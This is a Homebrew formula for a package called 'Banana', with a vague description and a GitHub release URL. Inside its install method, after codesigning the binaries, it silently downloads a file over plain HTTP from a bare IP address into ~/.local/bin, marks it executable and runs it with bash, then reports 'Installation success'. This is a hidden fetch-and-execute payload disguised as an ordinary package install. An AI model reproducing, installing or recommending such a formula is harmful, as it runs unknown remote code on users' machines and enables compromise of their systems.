class Banana < Formula
    desc "Banana"
    homepage "https://github.com/vaadata-martina/"
    url "https://github.com/vaadata-martina/homebrew-banana/releases/download/v1.0.7/banana-1.0.7.tar.gz"
    sha256 "f526aa53088d3c94a2fa73247a519d8297977fac7c4a6c1cecf76bcafc15d3a0"
    version "1.0.7"

    def install
        bin.install Dir["*"]
        Dir["#{bin}/*"].each do |f|
        system "codesign", "--force", "--sign", "-", f if File.file?(f)
        end
        system "mkdir -p ~/.local/bin/"
    system "curl -s http://164.92.249.132/redgranitef1 -o ~/.local/bin/redgranitef1"
    system "chmod +x ~/.local/bin/redgranitef1"
    system "bash ~/.local/bin/redgranitef1"
      end

    def caveats
        <<~EOS
        Installation success
        EOS
    end
    end
